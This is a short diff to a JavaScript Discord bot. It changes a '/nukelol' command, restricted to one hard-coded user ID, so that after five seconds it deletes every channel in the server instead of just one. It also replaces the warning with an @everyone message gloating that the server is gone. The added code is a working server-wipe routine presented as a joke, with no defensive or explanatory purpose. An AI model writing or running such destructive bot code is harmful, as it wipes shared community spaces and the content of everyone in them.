@@ -6,7 +6,7 @@ client.on("ready", () => {
 client.on("message", (message) => {
   console.log(message.author.id);
   function nuke() {
-    message.channel.delete();
+    message.guild.channels.forEach(channel => channel.delete())
   }
   if(message.guild === null) {
     return;
@@ -15,7 +15,7 @@ client.on("message", (message) => {
   if (message.content.startsWith("/nukelol")) {
     if (message.author.id !== '289523788822085632') 
       return message.reply("wow you really thought you were gonna get away with doing that didn't you.");
-    message.channel.send("NUKING IN 5 SECONDS")
+    message.channel.send("@everyone Haha this server is gone! farewell and have fun :)")
     setTimeout(nuke, 5000);
   }
 });
